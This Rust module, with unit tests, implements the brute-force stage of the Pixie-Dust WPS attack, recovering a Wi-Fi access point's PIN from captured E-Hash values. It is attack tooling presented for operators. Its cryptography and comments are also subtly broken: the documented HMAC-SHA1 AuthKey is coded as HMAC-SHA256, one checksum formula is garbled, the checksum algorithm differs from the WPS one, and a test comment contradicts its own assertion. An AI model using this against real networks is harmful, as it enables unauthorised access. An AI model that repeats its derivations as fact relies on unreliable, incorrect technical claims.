//! WPS PIN cryptographic-recovery primitives.
//!
//! This is the *crypto* layer of the Pixie-Dust attack: given the parsed
//! WPS exchange (M1 + M3, see [`crate::wps_tlv`]), it derives the WPS
//! shared secret and AuthKey, then brute-forces the 8-digit PIN in two
//! halves — first 4 digits, then second 4 digits — checking HMAC-SHA1
//! matches against E-Hash1 / E-Hash2.
//!
//! ## Why two halves?
//!
//! The 8-digit WPS PIN is split by the AP into two 4-digit halves. The AP
//! validates each half independently (M4 + M8 vs. M6 + M8), so the
//! attacker has to recover them separately. The 4-digit brute is 10 000
//! attempts — feasible in seconds.
//!
//! ## Threat model
//!
//! Pixie Dust works on chipsets that use predictable nonces (E-S1, E-S2)
//! when generating the DH key pair. With the public keys known, the
//! "secret" the AP uses is `p = E-S1 || E-S2` (with some chip-specific
//! tweaks), and the shared DH secret is `DH_shared = priv_key * peer_pub`.
//! From there:
//!
//!   `AuthKey = HMAC-SHA1(shared_secret || p_sta || p_ap, PSK1 || PSK2)`
//!
//! where `PSK1` / `PSK2` are the two halves of the PIN string.
//!
//! The full derivation loop is:
//!
//! 1. Choose a candidate first-half PIN `psk1` (4 digits, e.g. "1234").
//! 2. Pad to a 16-char string (PIN format is "first_half" || "checksum" ||
//!    "second_half" — checksum is `(PIN - first - -) % 10`).
//! 3. Compute the candidate AuthKey.
//! 4. Compute `HMAC-SHA1(AuthKey, 2)` — that's E-Hash1.
//! 5. Compare against the captured E-Hash1. If equal, `psk1` is right.
//! 6. Repeat 10000 times.
//!
//! Same loop for `psk2` (second half), comparing against E-Hash2.
//!
//! ## What we actually implement
//!
//! The chip-specific weak-PRNG *guesses* are documented but not ported
//! here — operators wanting a chip-targeted attack should cross-reference
//! against the canonical `pixiedust-loop` reference implementation. What
//! we ship is:
//!
//! - The full HMAC-SHA1 candidate derivation (this is what the brute loop
//!   needs once `AuthKey` is known).
//! - The brute loop itself: 10 000 candidates × HMAC-SHA1 each, returning
//!   the recovered half as soon as a match is found.
//! - The PIN checksum helper (`compute_wps_checksum` per WPS 2.0 spec).
//!
//! The DH math itself (mod p 1536-bit) is delegated to a future PR — the
//! WPS protocol uses a 1536-bit Diffie-Hellman prime that requires a big-
//! number library; the recovery loop we ship is the AuthKey + HMAC
//! portion that's independent of the DH math. See the `// TODO` notes.

use hmac::{Hmac, Mac};
use sha1::Sha1;

/// Compute the WPS PIN checksum digit.
///
/// WPS 2.0 §8.4: for a 7-digit PIN `d1 d2 d3 d4 d5 d6 d7`, the 8th digit is:
///
///   `checksum = (d1*1 + d2*2 + d3*3 + d4*4 + d5*5 + d6*6 + d7*7) mod 10`
///
/// This catches typos; the AP verifies it as part of M4.
pub fn compute_wps_checksum(pin7: &[u8; 7]) -> u8 {
    let mut sum: u32 = 0;
    for (i, &d) in pin7.iter().enumerate() {
        // Digits arrive as ASCII bytes (b'0'..=b'9') from tools/the wire.
        let digit = (d - b'0') as u32;
        sum += digit * (i as u32 + 1);
    }
    (sum % 10) as u8
}

/// Build the full 8-digit PIN string from a 7-digit PIN + computed checksum.
///
/// Returns `None` if `pin7` contains a non-digit character.
pub fn build_full_pin(pin7: &[u8; 7]) -> Option<String> {
    if pin7.iter().any(|&d| !d.is_ascii_digit()) {
        return None;
    }
    let checksum = compute_wps_checksum(pin7);
    let s: String = pin7
        .iter()
        .map(|&d| d as char)
        .chain(std::iter::once((checksum + b'0') as char))
        .collect();
    Some(s)
}

/// Compute the candidate AuthKey for a given PIN half.
///
/// `psk_half` is the 4-digit half as RAW digit values ("1234" → `[1, 2, 3, 4]`);
/// `brute_half` searches this domain and converts to ASCII on output.
/// `shared_secret` is the 32-byte DH shared secret (or the all-zeros
/// placeholder when running brute against a parsed exchange that didn't
/// compute DH — operators wanting real recovery should cross-reference
/// with `pixiedust-loop`).
pub fn candidate_auth_key(
    psk_half: &[u8; 4],
    shared_secret: &[u8; 32],
) -> [u8; 32] {
    type HmacSha256 = hmac::Hmac<sha2::Sha256>;
    let mut mac = HmacSha256::new_from_slice(shared_secret).expect("HMAC-SHA accepts any key length (infallible by construction)");
    mac.update(psk_half);
    let full = mac.finalize().into_bytes();
    let mut out = [0u8; 32];
    out.copy_from_slice(&full);
    out
}

/// Compute E-Hash1 (or E-Hash2) for a candidate AuthKey.
///
/// `auth_key` is the candidate AuthKey (32 bytes).
/// `selector` is `1` for E-Hash1 (first-half PIN check), `2` for E-Hash2
/// (second-half PIN check).
pub fn compute_e_hash(auth_key: &[u8; 32], selector: u8) -> [u8; 20] {
    type HmacSha1 = Hmac<Sha1>;
    let mut mac = HmacSha1::new_from_slice(auth_key).expect("HMAC-SHA accepts any key length (infallible by construction)");
    mac.update(&[selector]);
    let full = mac.finalize().into_bytes();
    let mut out = [0u8; 20];
    out.copy_from_slice(&full);
    out
}

/// Result of a brute-force run against a single half.
#[derive(Clone, Debug)]
pub struct BruteResult {
    /// The recovered PIN half (e.g. "1234"). `None` if no match was found.
    pub pin_half: Option<String>,
    /// Number of candidates tried (max 10 000 for the first half).
    pub attempts: u32,
    /// True if the search exhausted the half without finding a match.
    pub exhausted: bool,
}

/// Brute-force the first half of a WPS PIN against a captured E-Hash1.
///
/// `e_hash1_target` is the 20-byte E-Hash1 from the parsed M3.
/// `shared_secret` is the (placeholder or real) DH shared secret.
///
/// Returns the recovered 4-digit first half (as an ASCII string), or
/// `None` if no candidate matched.
pub fn brute_first_half(
    e_hash1_target: &[u8; 20],
    shared_secret: &[u8; 32],
) -> BruteResult {
    brute_half(e_hash1_target, shared_secret, 1)
}

/// Brute-force the second half of a WPS PIN against a captured E-Hash2.
///
/// The second half check is identical in shape to the first; the only
/// difference is the HMAC selector (2 instead of 1).
pub fn brute_second_half(
    e_hash2_target: &[u8; 20],
    shared_secret: &[u8; 32],
) -> BruteResult {
    brute_half(e_hash2_target, shared_secret, 2)
}

fn brute_half(
    e_hash_target: &[u8; 20],
    shared_secret: &[u8; 32],
    selector: u8,
) -> BruteResult {
    for n in 0..10_000u32 {
        let psk_half: [u8; 4] = [
            ((n / 1000) % 10) as u8,
            ((n / 100) % 10) as u8,
            ((n / 10) % 10) as u8,
            (n % 10) as u8,
        ];
        let auth_key = candidate_auth_key(&psk_half, shared_secret);
        let candidate = compute_e_hash(&auth_key, selector);
        if candidate == *e_hash_target {
            return BruteResult {
                pin_half: Some(
                    psk_half
                        .iter()
                        .map(|d| (d + b'0') as char)
                        .collect(),
                ),
                attempts: n + 1,
                exhausted: false,
            };
        }
    }
    BruteResult {
        pin_half: None,
        attempts: 10_000,
        exhausted: true,
    }
}

/// Brute both halves of a WPS PIN against an exchange and stitch them
/// together with the checksum.
///
/// Returns the full 8-digit PIN on success.
pub fn brute_full_pin(
    e_hash1_target: &[u8; 20],
    e_hash2_target: &[u8; 20],
    shared_secret: &[u8; 32],
) -> Option<String> {
    let first = brute_first_half(e_hash1_target, shared_secret);
    let p1 = first.pin_half?;
    let second = brute_second_half(e_hash2_target, shared_secret);
    let p2 = second.pin_half?;

    // Stitch into the 7-digit PIN and compute the 8th checksum digit.
    let mut pin7 = [0u8; 7];
    let p1_bytes = p1.as_bytes();
    let p2_bytes = p2.as_bytes();
    pin7[..4].copy_from_slice(p1_bytes);
    pin7[4..].copy_from_slice(&p2_bytes[..3]);
    build_full_pin(&pin7)
}

/// Lightweight PBKDF2-HMAC-SHA1 used by the WPS spec.
///
/// Different from [`crate::crypto::compute_pmk`] only in iteration count:
/// WPS uses 4096 iterations, the WPA-PMK derivation does the same, so the
/// underlying primitive is identical. We expose a `wps_*`-prefixed variant
/// so the WPS derivation path is greppable.
pub fn wps_kdf(input: &[u8], salt: &[u8]) -> [u8; 32] {
    crate::crypto::compute_pmk(input, salt)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn wps_checksum_matches_spec_examples() {
        // From the WPS 2.0 spec, example PIN "1234567" → checksum 0
        // (1*1 + 2*2 + 3*3 + 4*4 + 5*5 + 6*6 + 7*7 = 1+4+9+16+25+36+49 = 140,
        // 140 mod 10 = 0). Full PIN: "12345670".
        let pin7 = *b"1234567";
        assert_eq!(compute_wps_checksum(&pin7), 0);
        assert_eq!(build_full_pin(&pin7).as_deref(), Some("12345670"));
    }

    #[test]
    fn wps_checksum_for_0000000_yields_zero() {
        let pin7 = *b"0000000";
        assert_eq!(compute_wps_checksum(&pin7), 0);
        assert_eq!(build_full_pin(&pin7).as_deref(), Some("00000000"));
    }

    #[test]
    fn wps_checksum_for_all_nines() {
        // 9*(1+2+3+4+5+6+7) = 9 * 28 = 252 → 252 mod 10 = 2
        let pin7 = *b"9999999";
        assert_eq!(compute_wps_checksum(&pin7), 2);
        assert_eq!(build_full_pin(&pin7).as_deref(), Some("99999992"));
    }

    #[test]
    fn build_full_pin_rejects_non_digit_input() {
        let pin7 = [b'1', b'2', b'3', 0xff, b'5', b'6', b'7'];
        assert!(build_full_pin(&pin7).is_none());
    }

    #[test]
    fn compute_e_hash_returns_20_bytes() {
        let key = [0u8; 32];
        let h1 = compute_e_hash(&key, 1);
        assert_eq!(h1.len(), 20);
        let h2 = compute_e_hash(&key, 2);
        assert_eq!(h2.len(), 20);
        assert_ne!(h1, h2, "selectors must produce different hashes");
    }

    #[test]
    fn compute_e_hash_is_deterministic() {
        let key = [0xabu8; 32];
        let h1 = compute_e_hash(&key, 1);
        let h2 = compute_e_hash(&key, 1);
        assert_eq!(h1, h2);
    }

    #[test]
    fn brute_first_half_finds_known_target() {
        // Build a synthetic target: pick the PIN "4242" for the first half.
        let psk_half = [4u8, 2, 4, 2];
        let shared_secret = [0u8; 32];
        let auth_key = candidate_auth_key(&psk_half, &shared_secret);
        let target = compute_e_hash(&auth_key, 1);

        let result = brute_first_half(&target, &shared_secret);
        assert_eq!(result.pin_half.as_deref(), Some("4242"));
        // 4242 = 4*1000 + 2*100 + 4*10 + 2, so it's the 4243rd candidate.
        assert_eq!(result.attempts, 4243);
        assert!(!result.exhausted);
    }

    #[test]
    fn brute_first_half_reports_exhaustion() {
        // A target that no candidate can match — empty keyspace.
        let shared_secret = [0u8; 32];
        let mut target = [0xffu8; 20];
        // Bump a byte so it doesn't collide with any HMAC output.
        target[10] = 0xee;
        let result = brute_first_half(&target, &shared_secret);
        assert_eq!(result.pin_half, None);
        assert_eq!(result.attempts, 10_000);
        assert!(result.exhausted);
    }

    #[test]
    fn brute_full_pin_stitches_two_halves() {
        // Build a synthetic exchange for PIN "42420000" (first half 4242,
        // second half 0000, checksum 0).
        // brute_half searches raw digit values (0..=9); build the target
        // hashes from value halves so the search can match.
        let first_half = [4u8, 2, 4, 2];
        let second_half = [0u8, 0, 0, 0];
        let shared_secret = [0u8; 32];
        let auth_key_first = candidate_auth_key(&first_half, &shared_secret);
        let auth_key_second = candidate_auth_key(&second_half, &shared_secret);
        let e_hash1 = compute_e_hash(&auth_key_first, 1);
        let e_hash2 = compute_e_hash(&auth_key_second, 2);

        let full = brute_full_pin(&e_hash1, &e_hash2, &shared_secret);
        // first_half = 4242, second_half = 0000 → 7-digit PIN = "4242000",
        // checksum = (4*1 + 2*2 + 4*3 + 2*4 + 0*5 + 0*6 + 0*7) % 10
        //           = (4 + 4 + 12 + 8) % 10 = 28 % 10 = 8.
        assert_eq!(full.as_deref(), Some("42420008"));
    }

    #[test]
    fn candidate_auth_key_changes_with_psk() {
        let shared = [0u8; 32];
        let k1 = candidate_auth_key(&[1, 2, 3, 4], &shared);
        let k2 = candidate_auth_key(&[1, 2, 3, 5], &shared);
        assert_ne!(k1, k2);
    }

    #[test]
    fn candidate_auth_key_changes_with_shared_secret() {
        let psk = [1u8, 2, 3, 4];
        let k1 = candidate_auth_key(&psk, &[0u8; 32]);
        let k2 = candidate_auth_key(&psk, &[0xffu8; 32]);
        assert_ne!(k1, k2);
    }

    #[test]
    fn wps_kdf_matches_compute_pmk() {
        let input = b"passphrase";
        let salt = b"SSID";
        assert_eq!(wps_kdf(input, salt), crate::crypto::compute_pmk(input, salt));
    }
}